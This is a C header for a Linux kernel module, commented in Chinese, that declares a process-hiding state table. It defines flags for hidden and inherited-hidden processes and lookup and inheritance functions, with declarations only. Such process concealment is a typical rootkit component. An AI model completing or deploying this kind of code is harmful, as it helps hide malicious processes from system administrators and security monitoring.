#ifndef _PROC_STATE_H_
#define _PROC_STATE_H_

#include <linux/types.h>
#include <linux/hashtable.h>
#include <linux/spinlock.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/string.h>

/* 隐藏标志位 */
enum proc_flags {
    PROC_HIDDEN_SELF      = (1 << 0),  /* 自身隐藏 */
    PROC_HIDDEN_INHERITED = (1 << 1),  /* 继承父进程隐藏 */
};

/* 进程状态结构体 */
struct proc_state {
    pid_t pid;
    pid_t ppid;
    u32 flags;
    bool ancestor_hidden;
    bool is_ancestor_root;  // 自隐藏祖宗节点
    struct hlist_node node;
};

/* 生命周期管理 */
int  proc_state_init(void);
void proc_state_cleanup(void);
int  lifecycle_init(void);
void lifecycle_cleanup(void);

/* 状态操作 */
bool proc_state_set(pid_t pid, pid_t ppid, u32 flags, bool ancestor_hidden, bool is_ancestor_root);
struct proc_state *proc_state_get(pid_t pid);
void proc_state_clear(pid_t pid);

/* 查询接口 */
bool proc_is_hidden(pid_t pid);
bool proc_state_any_ancestor_hidden(pid_t pid);

/* 继承逻辑 */
void proc_state_inherit(pid_t parent, pid_t child);

/* 查找祖宗是否隐藏（沿父链查找） */
bool resolve_ancestor_hidden(pid_t ppid);


#endif /* _PROC_STATE_H_ */

